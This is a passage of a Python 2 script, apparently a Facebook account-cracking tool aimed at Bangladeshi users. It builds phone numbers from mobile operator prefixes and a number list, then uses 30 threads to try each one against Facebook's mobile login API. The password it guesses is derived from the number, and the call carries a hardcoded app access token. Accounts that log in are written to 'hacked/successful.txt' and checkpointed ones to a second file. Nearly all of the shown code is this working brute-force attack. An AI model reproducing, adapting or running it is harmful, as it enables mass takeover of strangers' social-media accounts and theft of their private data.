				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackten()
	elif crkten =="7" or crkten =="07":
		system("clear")
		print (logo)
		try:
			c="18"
			k="+880"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackten()
	elif crkten =='8' or crkten =="08":
	    sleep(1)
	    crackten()
	elif crkten =='0' or crkten =="00":
	    exithr()
	else:
		print '\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Invalid command \033[1;91m[\033[1;93m!\033[1;91m]\n'
		crackten()

	xxx = str(len(id))
	htrprint ('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Total Numbers \033[1;96m:\033[1;93m '+xxx)
	htrprint ('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Process is Starting...\n')
	time.sleep(1)
	print '\x1b[36m  тХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР'
	print

	def main(arg):
		global htrb,htrk
		user = arg
		try:
			os.mkdir('hacked')
		except OSError:
			pass
		try:
			pass1 = c+user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '  \033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m ' + k + c + user + ' | ' + pass1+'\n'
				htrpl = open('hacked/successful.txt', 'a')
				htrpl.write(k+c+user+' | '+pass1+'\n')
				htrpl.close()
				htrk.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '  \033[1;91m[\033[1;96mCheckpoint\033[1;91m]\033[1;97m ' + k + c + user + ' | ' + pass1+'\n'
					htrp = open('hacked/checkpoint.txt', 'a')
					htrp.write(k+c+user+' | '+pass1+'\n')
					htrp.close()
					htrb.append(c+user+pass1)

		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print '\x1b[36m  тХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР'
	htrprint('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Hacking Has Been Completed....')
	htrprint('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Succeed \033[1;97m|\033[1;92m Checkpoint \033[1;96m:\033[1;93m ' + str(len(htrk)) + ' \033[1;97m| \033[1;93m' + str(len(htrb)))
	htrprint('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;96m Data Has been Saved to " hacked "')
	print
	os.sys.exit()

#--- 11 DIGIT ---#

def crackelv():
	system('clear')
	htrprint (logo)
	print("\033[1;91m[\033[1;93m01\033[1;91m]\033[1;92m Grameenphone \n\033[1;91m[\033[1;93m02\033[1;91m]\033[1;92m Grameenphone \033[1;91m[\033[1;93m Mirror \033[1;91m]\033[0m \n\033[1;91m[\033[1;93m03\033[1;91m]\033[1;92m Banglalink \n\033[1;91m[\033[1;93m04\033[1;91m]\033[1;92m Banglalink \033[1;91m[\033[1;93m Mirror \033[1;91m]\033[0m \n\033[1;91m[\033[1;93m05\033[1;91m]\033[1;92m Teletalk \n\033[1;91m[\033[1;93m06\033[1;91m]\033[1;92m Airtel \n\033[1;91m[\033[1;93m07\033[1;91m]\033[1;92m Robi \n\033[1;91m[\033[1;93m08\033[1;91m]\033[1;92m Follow Me \n\033[1;91m[\033[1;93m00\033[1;91m]\033[1;92m Exit \n")
	cr3krelv()

def cr3krelv():
	crkelv = raw_input('\033[1;96m Select an Option \033[1;97m:\033[1;93m ')
	if crkelv =='':
		print '\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Invalid command \033[1;91m[\033[1;93m!\033[1;91m]\n'
		crackelv()
	elif crkelv =="1" or crkelv =="01":
		system("clear")
		print (logo)
		try:
			c="017"
			k="+88"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackelv()
	elif crkelv =="2" or crkelv =="02":
		system("clear")
		print (logo)
		try:
			c="013"
			k="+88"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackelv()
	elif crkelv =="3" or crkelv =="03":
		system("clear")
		print (logo)
		try:
			c="019"
			k="+88"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackelv()
	elif crkelv =="4" or crkelv =="04":
		system("clear")
		print (logo)
		try:
			c="014"
			k="+88"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackelv()
	elif crkelv =="5" or crkelv =="05":
		system("clear")
		print (logo)
		try:
			c="015"
			k="+88"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackelv()
	elif crkelv =="6" or crkelv =="06":
		system("clear")
		print (logo)
		try:
			c="016"
			k="+88"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackelv()
	elif crkelv =="7" or crkelv =="07":
		system("clear")
		print (logo)
		try:
			c="018"
			k="+88"
			idlist = ('.num')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Unknown Error \033[1;91m[\033[1;93m!\033[1;91m]")
			sleep(1)
			crackelv()
	elif crkelv =='8' or crkelv =="08":
	    sleep(1)
	    crackelv()
	elif crkelv =='0' or crkelv =="00":
	    exithr()
	else:
		print '\n\n \033[1;91m[\033[1;93m!\033[1;91m]\033[1;96m Invalid command \033[1;91m[\033[1;93m!\033[1;91m]\n'
		crackelv()

	xxx = str(len(id))
	htrprint ('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Total Numbers \033[1;96m:\033[1;93m '+xxx)
	htrprint ('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Process is Starting...\n')
	time.sleep(1)
	print '\x1b[36m  тХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР'
	print

	def main(arg):
		global htrb,htrk
		user = arg
		try:
			os.mkdir('hacked')
		except OSError:
			pass
		try:
			pass1 = c+user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '  \033[1;91m[\033[1;92mSuccessful\033[1;91m]\033[1;97m ' + k + c + user + ' | ' + pass1+'\n'
				htrpl = open('hacked/successful.txt', 'a')
				htrpl.write(k+c+user+' | '+pass1+'\n')
				htrpl.close()
				htrk.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '  \033[1;91m[\033[1;96mCheckpoint\033[1;91m]\033[1;97m ' + k + c + user + ' | ' + pass1+'\n'
					htrp = open('hacked/checkpoint.txt', 'a')
					htrp.write(k+c+user+' | '+pass1+'\n')
					htrp.close()
					htrb.append(c+user+pass1)

		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print '\x1b[36m  тХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХР'
	htrprint('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Hacking Has Been Completed....')
	htrprint('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;92m Succeed \033[1;97m|\033[1;92m Checkpoint \033[1;96m:\033[1;93m ' + str(len(htrk)) + ' \033[1;97m| \033[1;93m' + str(len(htrb)))
	htrprint('  \033[1;91m[\033[1;93mтЬУ\033[1;91m]\033[1;96m Data Has been Saved to " hacked "')
	print
	os.sys.exit()

if __name__=="__main__":
    cra3kmenu()
